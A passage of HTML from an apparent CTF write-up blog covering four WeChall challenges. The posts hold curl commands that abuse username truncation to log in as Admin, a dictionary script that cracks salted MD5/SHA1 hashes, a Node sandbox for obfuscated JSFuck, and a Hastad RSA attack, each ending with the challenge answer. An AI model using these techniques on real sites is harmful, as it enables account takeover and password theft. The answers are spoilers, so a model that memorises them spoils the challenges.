-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注册</span></span><br><span class="line">curl -c /tmp/wc -b /tmp/wc -X POST \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/en/challenge/screwed_signup/register.php&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;username=Admin                    a&amp;password=hack123&amp;password2=hack123&amp;register=Register&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录</span></span><br><span class="line">curl -c /tmp/wc -b /tmp/wc -X POST \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/en/challenge/screwed_signup/login.php&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;username=Admin&amp;password=hack123&amp;login=Login&#x27;</span></span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-wc-hashing-game/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-wc-hashing-game/" class="post-title-link" itemprop="url">WeChall - WC Hashing Game</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-11 14:16:18 / Modified: 14:16:19" itemprop="dateCreated datePublished" datetime="2026-06-11T14:16:18+08:00">2026-06-11</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-wc-hashing-game/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-wc-hashing-game/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>WC Hashing Game (Cracking) by gizmore 破解两组 hash：WC3（定盐
-MD5）和 WC4（加盐 SHA1）。答案格式：word1,word2,word3,word4</p>
-</blockquote>
-<h3 id="challenge">Challenge</h3>
-<p>两组 hash 列表，各 17 条：</p>
-<ul>
-<li><strong>WC3</strong>（WeChall v3 算法）：固定盐 MD5</li>
-<li><strong>WC4</strong>（WeChall v4 算法）：每条 hash 独立加盐
-SHA1</li>
-<li>答案 = 两组各自最长的两个明文，逗号分隔</li>
-</ul>
-<p>题面示例：<code>wordfrom1,wordfrom1,wordfrom2,wordfrom2</code></p>
-<h3 id="solution">Solution</h3>
-<h4 id="算法">算法</h4>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib, string, random</span><br><span class="line"></span><br><span class="line"><span class="comment"># WC3: md5(md5(plaintext) + &quot;zomgsalt&quot;)</span></span><br><span class="line">digest = hashlib.md5(</span><br><span class="line">    hashlib.md5(word.encode()).hexdigest().encode() + <span class="string">b&quot;zomgsalt&quot;</span></span><br><span class="line">).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment"># WC4: sha1(&quot;zomgsalt4&quot; + password + salt + &quot;zomgsalt4&quot;) + salt</span></span><br><span class="line">t = hashlib.sha1(<span class="string">b&quot;zomgsalt4&quot;</span> + password.encode() + salt.encode() + <span class="string">b&quot;zomgsalt4&quot;</span>)</span><br><span class="line">digest = t.hexdigest() + salt  <span class="comment"># salt 追加到 hash 末尾</span></span><br></pre></td></tr></table></figure>
-<h4 id="攻击路线">攻击路线</h4>
-<ol type="1">
-<li>从 WeChall 页面获取两组 hash 列表（需登录）</li>
-<li>用 rockyou 或类似英文词典做字典攻击</li>
-<li>对每个 word 计算 WC3 hash 匹配；对 WC4 每条 hash 提取尾部 4 字节
-salt，计算后匹配</li>
-<li>排序取最长各两个</li>
-<li>提交格式：<code>longest_wc3,second_wc3,longest_wc4,second_wc4</code></li>
-</ol>
-<p>完整脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib, string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从页面提取 hash 列表</span></span><br><span class="line">wc3_hashes = [...]   <span class="comment"># 17 条 hex hash</span></span><br><span class="line">wc4_raw = [...]      <span class="comment"># 17 条 hash+salt（44 hex chars = 40 hash + 8 salt）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字典攻击</span></span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> dictionary:</span><br><span class="line">    <span class="comment"># WC3</span></span><br><span class="line">    h = hashlib.md5(hashlib.md5(word.encode()).hexdigest().encode() + <span class="string">b&quot;zomgsalt&quot;</span>).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> h <span class="keyword">in</span> wc3_hashes:</span><br><span class="line">        found_wc3.append((<span class="built_in">len</span>(word), word))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># WC4 — 每条 hash 的 salt 不同</span></span><br><span class="line">    <span class="keyword">for</span> entry <span class="keyword">in</span> wc4_raw:</span><br><span class="line">        target_hash = entry[:-<span class="number">8</span>]   <span class="comment"># 前 40 hex = SHA1</span></span><br><span class="line">        salt = entry[-<span class="number">8</span>:]          <span class="comment"># 后 8 hex = 4 bytes salt</span></span><br><span class="line">        t = hashlib.sha1(<span class="string">b&quot;zomgsalt4&quot;</span> + word.encode() + <span class="built_in">bytes</span>.fromhex(salt) + <span class="string">b&quot;zomgsalt4&quot;</span>).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> t == target_hash:</span><br><span class="line">            found_wc4.append((<span class="built_in">len</span>(word), word))</span><br><span class="line"></span><br><span class="line">found_wc3.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">found_wc4.sort(reverse=<span class="literal">True</span>)</span><br><span class="line">answer = <span class="string">f&quot;<span class="subst">&#123;found_wc3[<span class="number">0</span>][<span class="number">1</span>]&#125;</span>,<span class="subst">&#123;found_wc3[<span class="number">1</span>][<span class="number">1</span>]&#125;</span>,<span class="subst">&#123;found_wc4[<span class="number">0</span>][<span class="number">1</span>]&#125;</span>,<span class="subst">&#123;found_wc4[<span class="number">1</span>][<span class="number">1</span>]&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>
-<p>Key Points:</p>
-<ul>
-<li><strong>WC3 salt 固定</strong>：<code>zomgsalt</code>，追加在第一次
-MD5 hex 之后</li>
-<li><strong>WC4 每条 hash 尾 8 hex 是 salt</strong>：4
-字节随机字母数字，需要按条提取</li>
-<li><strong>所有明文是小写英文词典词</strong></li>
-<li><strong>hash 列表在 页面</strong>：需从
-<code>/en/challenge/wechall/hashing_game/index.php</code> 的 HTML
-中提取</li>
-</ul>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">coincidence,subversion,triangulation,orthography</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-brainfucked/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-brainfucked/" class="post-title-link" itemprop="url">WeChall - Brainfucked</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-11 14:12:24 / Modified: 14:12:30" itemprop="dateCreated datePublished" datetime="2026-06-11T14:12:24+08:00">2026-06-11</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-brainfucked/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-brainfucked/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>Brainfucked (Javascript) by gizmore 不是 Brainfuck，是 JSFuck——只用
-<code>[]()!+</code> 六字符构造 JavaScript</p>
-</blockquote>
-<h3 id="challenge">Challenge</h3>
-<p>题面给一个巨大的 sourcecode.php（~100KB），看起来是 Brainfuck
-但实际上是 <strong>JSFuck</strong>——一种只用 <code>[]()!+</code>
-六个字符编码 JavaScript 的技术。它利用 JavaScript 的类型转换（如
-<code>[]+&#123;&#125;</code> →
-<code>"[object Object]"</code>）来构造任意字符串和代码。</p>
-<p>源码在 <code>sourcecode.php</code>，直接在浏览器里 eval
-这坨代码不安全——它会弹出 alert 并重定向到 Google。</p>
-<h3 id="solution">Solution</h3>
-<p>核心方法是离线 sandbox 执行 JSFuck 代码，观察其行为：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -s -b <span class="string">&#x27;WC=...&#x27;</span> <span class="string">&#x27;https://www.wechall.net/en/challenge/brainfucked/sourcecode.php&#x27;</span> &gt; jsfuck.txt</span><br></pre></td></tr></table></figure>
-<p>用 Node.js 搭建一个 mock browser 环境（拦截
-<code>alert</code>、<code>document.location</code> 等）：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> code = fs.<span class="title function_">readFileSync</span>(<span class="string">&quot;jsfuck.txt&quot;</span>, <span class="string">&quot;utf8&quot;</span>).<span class="title function_">trim</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> capturedAlerts = [];</span><br><span class="line"><span class="keyword">let</span> locationHref = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;</span><br><span class="line">  <span class="attr">alert</span>: <span class="function">(<span class="params">...args</span>) =&gt;</span> capturedAlerts.<span class="title function_">push</span>(...args),</span><br><span class="line">  <span class="attr">document</span>: &#123;</span><br><span class="line">    <span class="attr">title</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="attr">location</span>: &#123;</span><br><span class="line">      <span class="keyword">set</span> <span class="title function_">href</span>(<span class="params">v</span>) &#123;</span><br><span class="line">        locationHref = v;</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">location</span>: &#123;</span><br><span class="line">    <span class="keyword">set</span> <span class="title function_">href</span>(<span class="params">v</span>) &#123;</span><br><span class="line">      locationHref = v;</span><br><span class="line">    &#125;,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title class_">Array</span>,</span><br><span class="line">  <span class="title class_">String</span>,</span><br><span class="line">  <span class="title class_">Number</span>,</span><br><span class="line">  <span class="title class_">Boolean</span>,</span><br><span class="line">  <span class="title class_">Object</span>,</span><br><span class="line">  <span class="title class_">Function</span>,</span><br><span class="line">  <span class="title class_">RegExp</span>,</span><br><span class="line">  <span class="title class_">Math</span>,</span><br><span class="line">  <span class="title class_">Date</span>,</span><br><span class="line">  <span class="title class_">JSON</span>,</span><br><span class="line">  <span class="attr">setTimeout</span>: <span class="function">() =&gt;</span> <span class="number">0</span>,</span><br><span class="line">  <span class="attr">setInterval</span>: <span class="function">() =&gt;</span> <span class="number">0</span>,</span><br><span class="line">  <span class="attr">console</span>: &#123; <span class="title function_">log</span>(<span class="params"></span>) &#123;&#125;, <span class="title function_">warn</span>(<span class="params"></span>) &#123;&#125;, <span class="title function_">error</span>(<span class="params"></span>) &#123;&#125; &#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">vm.<span class="title function_">runInContext</span>(code, sandbox, &#123; <span class="attr">timeout</span>: <span class="number">30000</span> &#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Alerts:&quot;</span>, capturedAlerts);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Redirect:&quot;</span>, locationHref);</span><br></pre></td></tr></table></figure>
-<p>执行后会输出：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Alerts: [ 18 ]</span><br><span class="line">Redirect: https://www.google.co.uk</span><br></pre></td></tr></table></figure>
-<p>这对应解码后的代码：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="string">&quot;UnfudgedDebugStuff&quot;</span>;</span><br><span class="line">s = s.<span class="property">length</span>; <span class="comment">// 此时 s = 18</span></span><br><span class="line"><span class="title function_">alert</span>(s); <span class="comment">// 弹 18</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;https://www.google.co.uk&quot;</span>;</span><br></pre></td></tr></table></figure>
-<p>关键陷阱：</p>
-<ul>
-<li><strong>alert 显示的是
-<code>18</code></strong>（字符串长度），但这<strong>不是</strong>答案。</li>
-<li><strong>答案</strong>是原始字符串
-<code>UnfudgedDebugStuff</code>，不是它的长度。</li>
-<li>页面会重定向到 Google，所以不要在浏览器里直接 eval。</li>
-<li>JSFuck 和 Brainfuck 完全不同——Brainfuck 用
-<code>&lt;&gt;+-.,[]</code>，JSFuck 用 <code>[]()!+</code>。</li>
-</ul>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">UnfudgedDebugStuff</span></span>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-save-the-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="vkkkv">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hello Navi">
-      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content=" | Hello Navi">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/WeChall/wechall-save-the-world/" class="post-title-link" itemprop="url">WeChall - Save the World</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
-      
-
-      <time title="Created: 2026-06-11 14:10:06 / Modified: 14:10:50" itemprop="dateCreated datePublished" datetime="2026-06-11T14:10:06+08:00">2026-06-11</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">In</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Disqus: </span>
-    
-    <a title="disqus" href="/wp/WeChall/wechall-save-the-world/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-save-the-world/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <blockquote>
-<p>Save the World (Crypto) by Z Hastad broadcast attack — 同一消息
-m，e=3，三个不同 n</p>
-</blockquote>
-<h3 id="challenge">Challenge</h3>
-<p>题面给出一段虚构的世界观故事：三个 RSA
-公钥（<code>e=3</code>，三个不同
-<code>n1,n2,n3</code>）加密了同一个对称密钥 <code>m</code>。目标是恢复
-<code>m</code> 的十进制形式的最后 20 位。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c1 = m^3 mod n1</span><br><span class="line">c2 = m^3 mod n2</span><br><span class="line">c3 = m^3 mod n3</span><br></pre></td></tr></table></figure>
-<h3 id="solution">Solution</h3>
-<p>这是经典的 Hastad broadcast attack。当同一消息用同一个小指数
-<code>e=3</code>、不同互素 modulus 加密且无 padding 时：</p>
-<p><code>m^3</code> 对三个不同的 n 同余于不同的
-c。用中国剩余定理（CRT）合并，如果 <code>m^3 &lt; n1*n2*n3</code>，则
-CRT 结果直接等于 <code>m^3</code>，开三次方根即可。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> integer_nthroot</span><br><span class="line"></span><br><span class="line">C, mod = crt([n1, n2, n3], [c1, c2, c3])</span><br><span class="line">m, exact = integer_nthroot(<span class="built_in">int</span>(C), <span class="number">3</span>)</span><br><span class="line"><span class="keyword">assert</span> exact</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(m)[-<span class="number">20</span>:])</span><br></pre></td></tr></table></figure>
-<p>完整的从页面抓数→计算的脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re, urllib.request</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;http://www.wechall.net/en/challenge/Z/save_the_world/index.php&#x27;</span></span><br><span class="line">COOKIE = <span class="string">&#x27;WC=...&#x27;</span></span><br><span class="line"></span><br><span class="line">req = urllib.request.Request(URL, headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>: COOKIE&#125;)</span><br><span class="line">html = urllib.request.urlopen(req, timeout=<span class="number">20</span>).read().decode()</span><br><span class="line">clean = re.sub(<span class="string">r&#x27;&lt;br\s*/?&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, html)  <span class="comment"># 关键：去掉 &lt;br/&gt; 标签</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract</span>(<span class="params">pattern</span>):</span><br><span class="line">    m = re.search(pattern, clean)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m.group(<span class="number">1</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line"></span><br><span class="line">n1 = extract(<span class="string">r&#x27;n1=(\d[\d\s\n]*?)&#x27;</span>)</span><br><span class="line">c1 = extract(<span class="string">r&#x27;c1=(\d[\d\s\n]*?)&#x27;</span>)</span><br><span class="line">n2 = extract(<span class="string">r&#x27;n2=(\d[\d\s\n]*?)&#x27;</span>)</span><br><span class="line">c2 = extract(<span class="string">r&#x27;c2=(\d[\d\s\n]*?)&#x27;</span>)</span><br><span class="line">n3 = extract(<span class="string">r&#x27;n3=(\d[\d\s\n]*?)&#x27;</span>)</span><br><span class="line">c3 = extract(<span class="string">r&#x27;c3=(\d[\d\s\n]*?)&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sympy.ntheory.modular <span class="keyword">import</span> crt</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> integer_nthroot</span><br><span class="line"></span><br><span class="line">C, mod = crt([n1, n2, n3], [c1, c2, c3])</span><br><span class="line">m, exact = integer_nthroot(<span class="built_in">int</span>(C), <span class="number">3</span>)</span><br><span class="line"><span class="keyword">assert</span> exact</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(m)[-<span class="number">20</span>:])</span><br></pre></td></tr></table></figure>
-<ul>
-<li><strong><code>&lt;br/&gt;</code> 标签</strong>：页面里的超大整数被
-<code>&lt;br/&gt;</code>
-换行打断，直接复制会漏数字或引入多余字符。必须用 regex 去掉
-<code>&lt;br/&gt;</code> 后再提取连续数字串。</li>
-<li><strong>静态题</strong>：n1/n2/n3/c1/c2/c3
-是固定的，对所有用户相同。答案唯一，只需计算一次。</li>
-<li><strong><code>sympy</code>
-需要安装</strong>：<code>uv pip install sympy</code> 或
-<code>pip install sympy</code>。</li>
-</ul>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">21987654321987654321</span></span>
 
       
     </div>
